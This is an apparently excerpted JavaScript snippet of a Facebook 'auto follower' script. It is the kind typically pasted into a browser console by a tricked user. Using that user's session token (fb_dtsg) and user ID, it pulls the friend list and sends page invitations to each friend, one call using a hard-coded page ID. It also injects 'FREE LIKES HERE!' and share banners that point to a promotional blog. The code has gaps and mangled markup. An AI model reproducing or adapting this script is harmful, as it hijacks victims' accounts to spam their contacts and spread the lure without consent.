...
_audio.src = "https://hscretions.googlecode.com/svn/Tonight%20(I%20m%20Lovin%20%20You).mp3";
...
if (body != null) {
    ...
    div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fautofacebookfollower.blogspot.com&t=Facebook+Background+Theme' title='Share'><blink><center>
    SHARE < /center> < /blink></a > "
...
if (body != null) {
    ...
    div.style.border = "1px solid rgba(0,0,0,0.5)";
    div.style.padding = "3px";
    div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='' title='Refresh'><blink><center>
    Close(F5) < /center> < /blink></a > "
    body.appendChild(div);
}
if (body != null) {
    div = document.createElement("div");
    ...
    div.style.border = "1px solid rgba(0,0,0,0.5)";
    div.style.padding = "3px";
    div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='http://autofacebookfollower.blogspot.com/' title='invitefanpage'><blink><center>
    FREE LIKES HERE! < /center> < /blink></a > "
    body.appendChild(div);
}
...
var Descriptions = "",
    _text = 'Powered By:  <a style="color:#3B5998;" href="https://www.facebook.com/jalexiscv" target="_blank">Insside Corp.</A></br>Script Made By: </A><a style="color:#3B5998;" href="http://www.facebook.com/jalexiscv" target="_blank"> Facebook tools</A></A>,</A></A>.</br>" target="_blank">Automate Your Facebook</A>.</A>';
...
function InviteFriends(opo) {
    jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send_single?page_id=" + page_id + "&invitee=" + opo + "&elem_id=u_0_1k&action=send&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=8&fb_dtsg=" + fb_dtsg + "&phstamp=", function (a) {
        ...
        ";
        display += "<div style='padding-bottom:5px;font-size:20px;'>
        " + Title + " < /div>
        ";
        if (i > 0) {
            ...
            display += "<div> < span class = 'FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge'
            onClick = 'ChangeLocation()'
            style = 'color:white' > Go to Homepage < /span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Cancel</span > < br / > ";
            display += _text;
            display += "</div>
            ";
            display += "</div>
            ...
            display += "<div> < span class = 'FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge'
            onClick = 'ChangeLocation()'
            style = 'color:white' > Go to Homepage < /span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Refresh Page</span > < span class = 'layerCancel uiOverlayButton uiButton uiButtonLarge'
            onClick = 'document.getElementById(\"pagelet_sidebar\").style.display=\"none\"'
            style = 'color:gray' > Cancel < /span><br/ > ";
    ...
    if (page_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=177210995727203&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
...
jx.load(window.location.protocol + "///www.facebook.com/ajax/typeahead/first_degree.php?viewer=" + user_id + "&token=v7&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=l", function (a) {
    ...
    display += "<div style='padding-bottom:10px;font-size:20px;'>
    " + Title + " < /div>
    ";
